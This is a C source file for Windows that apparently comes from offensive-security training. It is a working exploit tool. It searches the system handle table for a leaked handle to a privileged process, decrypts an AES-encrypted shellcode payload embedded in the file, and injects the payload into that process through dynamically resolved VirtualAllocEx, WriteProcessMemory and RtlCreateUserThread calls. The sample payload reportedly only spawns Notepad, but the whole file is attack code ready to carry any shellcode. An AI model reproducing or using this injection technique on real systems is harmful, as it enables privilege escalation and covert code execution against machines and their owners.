
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "client.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


HANDLE GetVulnProcHandle(void) {
    
	ULONG handleInfoSize = 0x10000;
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc(handleInfoSize);
	HANDLE hProc = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	PVOID objectNameInfo;
	UNICODE_STRING objectName;
    ULONG returnLength;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD dwOwnPID = GetCurrentProcessId();
	
    pNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtDuplicateObject = GetProcAddress(hNtdll, "NtDuplicateObject");
    pNtQueryObject = GetProcAddress(hNtdll, "NtQueryObject");
    pRtlEqualUnicodeString = GetProcAddress(hNtdll, "RtlEqualUnicodeString");
    pRtlInitUnicodeString = GetProcAddress(hNtdll, "RtlInitUnicodeString");

    printf("[+] Grabbing handles...");

    while ((status = pNtQuerySystemInformation( SystemHandleInformation, phHandleInfo, handleInfoSize,
											NULL )) == STATUS_INFO_LENGTH_MISMATCH)
        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) realloc(phHandleInfo, handleInfoSize *= 2);

    if (status != STATUS_SUCCESS)
    {
        printf("[!] NtQuerySystemInformation failed!\n");
        return 0;
    }

    printf("done.\n[+] Fetched %d handles.\n", phHandleInfo->NumberOfHandles);

    // iterate handles until we find the privileged process handle
    for (int i = 0; i < phHandleInfo->NumberOfHandles; ++i)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = phHandleInfo->Handles[i];

        // Check if this handle belongs to our own process
        if (handle.UniqueProcessId != dwOwnPID)
            continue;

        objectTypeInfo = (POBJECT_TYPE_INFORMATION) malloc(0x1000);
        if (pNtQueryObject( (HANDLE) handle.HandleValue,
						ObjectTypeInformation,
						objectTypeInfo,
						0x1000,
						NULL ) != STATUS_SUCCESS)
            continue;

		// skip some objects to avoid getting stuck
		// see: https://github.com/adamdriscoll/PoshInternals/issues/7
        if (handle.GrantedAccess == 0x0012019f
			&& handle.GrantedAccess != 0x00120189
			&& handle.GrantedAccess != 0x120089
			&& handle.GrantedAccess != 0x1A019F ) {
            free(objectTypeInfo);
            continue;
        }

		// get object name information
        objectNameInfo = malloc(0x1000);
        if (pNtQueryObject( (HANDLE) handle.HandleValue,
						ObjectNameInformation,
						objectNameInfo,
						0x1000,
						&returnLength ) != STATUS_SUCCESS) {
            
			// adjust the size of a returned object and query again
			objectNameInfo = realloc(objectNameInfo, returnLength);
            if (pNtQueryObject( (HANDLE) handle.HandleValue,
							ObjectNameInformation,
							objectNameInfo,
							returnLength,
							NULL ) != STATUS_SUCCESS) {
                free(objectTypeInfo);
                free(objectNameInfo);
                continue;
            }
        }

        // check if we've got a process object
        objectName = *(PUNICODE_STRING) objectNameInfo;
        UNICODE_STRING pProcess;

        pRtlInitUnicodeString(&pProcess, L"Process");
        if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
            printf("[+] Found process handle (%x)\n", handle.HandleValue);
            hProc = (HANDLE) handle.HandleValue;
			free(objectTypeInfo);
			free(objectNameInfo);
			break;
        }
        else
            continue;
        
        free(objectTypeInfo);
        free(objectNameInfo);
    }
	
	return hProc;
} 

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
	
	LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
	
	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
	
    bStatus = (BOOL) pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);
	if (bStatus != FALSE) {
			WaitForSingleObject(hThread, -1);
			CloseHandle(hThread);
			return 0;
	}
	else
		return -1;
}

int main(int argc, char **argv) {
	
	int pid = 0;
	HANDLE hProc = NULL;

	// AES encrypted shellcode spawning notepad.exe (ExitThread)
	char key[] = { 0x49, 0xbc, 0xa5, 0x1d, 0xa7, 0x3d, 0xd6, 0x0, 0xee, 0x2, 0x29, 0x3e, 0x9b, 0xb2, 0x8a, 0x69 };
	unsigned char payload[] = { 0x6b, 0x98, 0xe8, 0x38, 0xaf, 0x82, 0xdc, 0xd4, 0xda, 0x57, 0x15, 0x48, 0x2f, 0xf0, 0x4e, 0xd3, 0x1a, 0x70, 0x6d, 0xbf, 0x53, 0xa8, 0xcb, 0xbb, 0xbb, 0x38, 0xf6, 0x4e, 0xee, 0x84, 0x36, 0xe5, 0x25, 0x76, 0xce, 0xb0, 0xf6, 0x39, 0x22, 0x76, 0x36, 0x3c, 0xe1, 0x13, 0x18, 0x9d, 0xb1, 0x6e, 0x0, 0x55, 0x8a, 0x4f, 0xb8, 0x2d, 0xe7, 0x6f, 0x91, 0xa8, 0x79, 0x4e, 0x34, 0x88, 0x24, 0x61, 0xa4, 0xcf, 0x70, 0xdb, 0xef, 0x25, 0x96, 0x65, 0x76, 0x7, 0xe7, 0x53, 0x9, 0xbf, 0x2d, 0x92, 0x25, 0x4e, 0x30, 0xa, 0xe7, 0x69, 0xaf, 0xf7, 0x32, 0xa6, 0x98, 0xd3, 0xbe, 0x2b, 0x8, 0x90, 0x0, 0x9e, 0x3f, 0x58, 0xed, 0x21, 0x69, 0xcb, 0x38, 0x5d, 0x5e, 0x68, 0x5e, 0xb9, 0xd6, 0xc5, 0x92, 0xd1, 0xaf, 0xa2, 0x5d, 0x16, 0x23, 0x48, 0xbc, 0xdd, 0x2a, 0x9f, 0x3c, 0x22, 0xdb, 0x19, 0x24, 0xdf, 0x86, 0x4a, 0xa2, 0xa0, 0x8f, 0x1a, 0xe, 0xd6, 0xb7, 0xd2, 0x6c, 0x6d, 0x90, 0x55, 0x3e, 0x7d, 0x9b, 0x69, 0x87, 0xad, 0xd7, 0x5c, 0xf3, 0x1, 0x7c, 0x93, 0x1d, 0xaa, 0x40, 0xf, 0x15, 0x48, 0x5b, 0xad, 0x6, 0xb5, 0xe5, 0xb9, 0x92, 0xae, 0x9b, 0xdb, 0x9a, 0x9b, 0x4e, 0x44, 0x45, 0xdb, 0x9f, 0x28, 0x90, 0x9e, 0x63, 0x23, 0xf2, 0xca, 0xab, 0xa7, 0x68, 0xbc, 0x31, 0xb4, 0xf9, 0xbb, 0x73, 0xd4, 0x56, 0x94, 0x2c, 0x63, 0x47, 0x21, 0x84, 0xa2, 0xb6, 0x91, 0x23, 0x8f, 0xa0, 0x46, 0x76, 0xff, 0x3f, 0x75, 0xd, 0x51, 0xc5, 0x70, 0x26, 0x1, 0xcf, 0x23, 0xbf, 0x97, 0xb2, 0x8d, 0x66, 0x35, 0xc8, 0xe3, 0x2, 0xf6, 0xbd, 0x44, 0x83, 0xf2, 0x80, 0x4c, 0xd0, 0x7d, 0xa3, 0xbd, 0x33, 0x8e, 0xe8, 0x6, 0xbc, 0xdc, 0xff, 0xe0, 0x96, 0xd9, 0xdc, 0x87, 0x2a, 0x81, 0xf3, 0x53, 0x37, 0x16, 0x3a, 0xcc, 0x3c, 0x34, 0x4, 0x9c, 0xc6, 0xbb, 0x12, 0x72, 0xf3, 0xa3, 0x94, 0x5d, 0x19, 0x43, 0x56, 0xa8, 0xba, 0x2a, 0x1d, 0x12, 0xeb, 0xd2, 0x6e, 0x79, 0x65, 0x2a };
	unsigned int payload_len = sizeof(payload);

	printf("My PID: %d\n", GetCurrentProcessId());
	getchar();
	
	// find a leaked handle to a process
	hProc = GetVulnProcHandle();
	
	if ( hProc != NULL) {
		
		// decrypt and inject payload
		AESDecrypt((char *) payload, payload_len, key, sizeof(key));
		printf("[+] Sending gift...");
		Inject(hProc, payload, payload_len);
		printf("done.\n");
	}
	getchar();

    return 0;
}

